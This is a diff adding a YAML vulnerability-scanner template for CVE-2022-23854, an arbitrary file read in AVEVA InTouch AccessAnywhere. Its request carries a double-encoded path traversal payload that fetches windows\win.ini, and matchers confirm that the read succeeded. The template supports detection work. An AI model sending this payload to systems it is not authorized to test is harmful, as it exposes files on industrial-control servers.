@@ -1,0 +1,34 @@
+id: aveva-intouch-accessanywhere-file-read
+info:
+  name: AVEVA InTouch AccessAnywhere Arbitrary File Read (CVE-2022-23854)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2022-23854,arbitrary-file-read
+  description: |
+    AVEVA InTouch AccessAnywhere is vulnerable to an arbitrary file read vulnerability, allowing unauthorized access to sensitive files.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[fonts]"
+          - "[files]"
+        part: body
+      - type: word
+        words:
+          - "EricomSecureGateway"
+        part: header
+      - type: regex
+        regex:
+          - "^application/octet-stream$"
+        part: header
+      - type: regex
+        regex:
+          - "^((?!<).)*$"
+        part: body
